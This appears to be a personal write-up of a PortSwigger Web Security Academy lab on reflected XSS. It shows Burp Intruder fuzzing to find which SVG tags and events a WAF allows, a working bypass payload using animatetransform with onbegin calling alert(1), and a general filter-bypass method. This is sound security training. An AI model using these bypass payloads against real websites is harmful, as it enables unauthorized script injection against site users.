# Lab 06 — Reflected XSS with Some SVG Markup Allowed

**Level:** Practitioner
**Type:** Reflected XSS + SVG Tag + Event Fuzzing
**Status:** ✅ Solved
**Platform:** PortSwigger Web Academy

---

## 🎯 Objective
WAF blocks common tags but misses some SVG tags and events.
Find the allowed SVG tag + allowed event and call `alert()`.

---

## 🧠 Concept
WAF uses a blacklist of known tags and events.
SVG has many tags and events — blacklists often miss some.
Strategy is same as Lab 03:
Fuzz tags → find allowed ones → fuzz events → find allowed ones
→ combine them into a working payload.

---

## 🪜 Steps to Reproduce

### Step 1 — Confirm Standard Tags Blocked
<img src=1 onerror=alert(1)>  → 400 Blocked 

### Step 2 — Fuzz Tags with Burp Intruder
Set payload position: ?search=<§tag§>

Use PortSwigger XSS Cheatsheet → Copy Tags to clipboard
Paste into Intruder payloads → Start Attack

**Allowed tags (200 response):**
✅ <svg>
✅ <animatetransform>
✅ <title>
✅ <image>

### Step 3 — Fuzz Events on animatetransform
Set payload position: /?search=<svg><animatetransform%20§event§=1>

Use PortSwigger XSS Cheatsheet → Copy Events to clipboard
Paste into Intruder payloads → Start Attack

**Allowed event (200 response):**
✅ onbegin

### Step 4 — Build Final Payload
```html
<svg><animatetransform onbegin=alert(1)>
```

### Step 5 — Deliver in Browser
https://YOUR-LAB-ID.web-security-academy.net/
?search="><svg><animatetransform onbegin=alert(1)>

Page loads → `onbegin` fires immediately →
`alert(1)` executes → Lab solved ✅

---

## 💉 Final Payload
```html
<svg><animatetransform onbegin=alert(1)>
```

URL encoded version:
%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

---

## 🔍 Why It Works

| Part | Reason |
|------|--------|
| `<svg>` | SVG tag — whitelisted, not blocked |
| `<animatetransform>` | SVG animation tag — missed by WAF blacklist |
| `onbegin` | SVG-specific event — fires when animation begins |
| Fires on page load | No user interaction needed — auto executes |

---

## 🔑 onbegin — What is it?
`onbegin` is an SVG animation event.
It fires when the animation starts — which is immediately
when the page loads. This makes it perfect for auto-execution
with zero user interaction needed.

It is SVG-specific — not found in HTML event lists —
so many WAFs miss it completely.

---

## 📊 SVG Labs Comparison

| Lab | Allowed Tags | Allowed Event | Technique |
|-----|-------------|---------------|-----------|
| 05 | svg, a | none | animate sets href at runtime |
| 06 | svg, animatetransform, title, image | onbegin | SVG animation event fires on load |

---

## 🧱 WAF Bypass Methodology (Refined)

Step 1 → Fuzz ALL tags → note which return 200
Step 2 → Pick best allowed tag
Step 3 → Fuzz ALL events on that tag → note which return 200
Step 4 → Combine allowed tag + allowed event
Step 5 → Test in browser → confirm execution

---

## 💡 Key Takeaway
WAF blacklists can never be complete.
SVG has a huge set of tags and events —
`animatetransform` + `onbegin` is a classic missed combo.
Always fuzz both tags AND events separately using Burp Intruder.
The PortSwigger XSS cheatsheet is your best wordlist for this.

---

## 🛠️ Tools Used
- Burp Suite — Intruder (tag fuzzing + event fuzzing)
- PortSwigger XSS Cheatsheet (wordlist source)
- Browser (payload confirmation)

---

## 🔗 References
- https://portswigger.net/web-security/cross-site-scripting/contexts
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet